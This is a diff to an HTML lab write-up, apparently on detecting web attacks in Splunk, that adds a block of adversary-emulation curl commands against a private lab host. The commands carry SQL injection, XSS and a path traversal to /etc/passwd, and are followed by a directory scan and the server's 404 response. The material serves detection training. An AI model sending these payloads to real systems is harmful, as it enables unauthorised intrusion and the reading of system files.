@@ -313,8 +313,14 @@ Modern web application attacks frequently leverage percent-encoding (e.g., <code
 | eval formatted_time=strftime(_time, "%Y-%m-%d %H:%M:%S")
 | table formatted_time clientip method uri status useragent attack_type</div>
 
-<h3>Adversary Execution &amp; Raw Web Server Responses</h3>
-<p>During the simulated engagement, Apache 2.4 responded with HTTP 404 status codes upon receiving the XSS attack payloads:</p>
+<h3>Adversary Emulation Commands &amp; Server Responses</h3>
+<div class="code-block"># Adversary Multi-Vector Attack Suite (Kali Linux 192.168.100.6)
+curl -s "http://192.168.100.9/?id=1'+OR+'1'='1"
+curl -s "http://192.168.100.9/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"
+curl -s "http://192.168.100.9/download.php?file=../../../../etc/passwd"
+curl -s -A "Nikto/2.1.6" "http://192.168.100.9/test/"
+for dir in admin login config backup db; do curl -s -o /dev/null "http://192.168.100.9/$dir"; done</div>
+<p>Apache 2.4 server response payload captured during exploit delivery:</p>
 <div class="code-block">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
 &lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
 &lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;
